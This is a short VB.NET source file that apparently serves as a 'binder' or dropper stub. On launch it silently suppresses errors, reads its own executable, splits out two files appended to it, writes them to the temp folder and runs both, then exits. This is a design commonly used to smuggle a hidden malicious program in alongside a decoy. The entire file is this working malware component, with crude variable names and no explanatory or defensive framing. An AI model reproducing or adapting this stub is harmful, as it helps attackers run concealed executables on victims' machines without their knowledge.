Public Class Form1
    Const FileSplit = "@@pinkhorseshit@@"

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim TPath As String = System.IO.Path.GetTempPath
        Const FileSplit = "@@72389@@"
        Dim file1, joesdaddy, punkbitch1, punkbitch2, filez() As String
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        file1 = Space(LOF(1))
        joesdaddy = Space(LOF(1))
        punkbitch1 = Space(LOF(1))
        punkbitch2 = Space(LOF(1))
        FileGet(1, file1)
        FileGet(1, joesdaddy)
        FileGet(1, punkbitch1)
        FileGet(1, punkbitch2)
        FileClose(1)
        filez = Split(file1, FileSplit)
        FileOpen(3, TPath & filez(3), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, filez(1))
        FileClose(3)
        FileOpen(5, TPath & filez(4), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(5, filez(2))
        FileClose(5)
        System.Diagnostics.Process.Start(TPath & filez(3))
        System.Diagnostics.Process.Start(TPath & filez(4))
        Me.Close()
        End
    End Sub
End Class
